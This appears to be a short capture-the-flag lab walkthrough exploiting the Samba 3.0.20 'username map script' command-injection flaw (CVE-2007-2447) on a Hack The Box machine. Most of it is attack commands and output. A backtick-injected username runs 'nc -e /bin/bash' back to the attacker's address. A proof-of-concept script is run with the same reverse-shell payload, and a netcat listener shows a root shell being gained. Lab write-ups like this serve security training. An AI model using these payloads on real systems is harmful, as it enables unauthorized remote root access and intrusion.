# Samba - opening windows to a wider world

Samba is the standard Windows interoperability suite of programs for Linux and Unix.

Homepage: [https://www.samba.org](https://www.samba.org)

## Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution

### Scanning

```
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                      
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

### Manual Exploit

Inject command to username using character \` to get execution. 

```
┌──(Hades㉿10.10.14.6)-[0.6:14.8]~/exploitation/samba
└─$ smbmap -u '/=`nc -e /bin/bash 10.10.14.6 443`' -H 10.10.10.3
```

### samba_rce_CVE-2007-2447.py

[*Poc code here*](https://raw.githubusercontent.com/leecybersec/exploitation/master/RemoteCodeExecution/SMB-Services/samba/samba_rce_CVE-2007-2447.py)

```
┌──(Hades㉿10.10.14.6)-[0.6:14.8]~/exploitation/samba
└─$ python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -e /bin/bash 10.10.14.6 443'
```

```
┌──(Hades㉿10.10.14.6)-[0.5:12.7]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.3] 43658
id
uid=0(root) gid=0(root)
```

## Reference

[https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation](https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)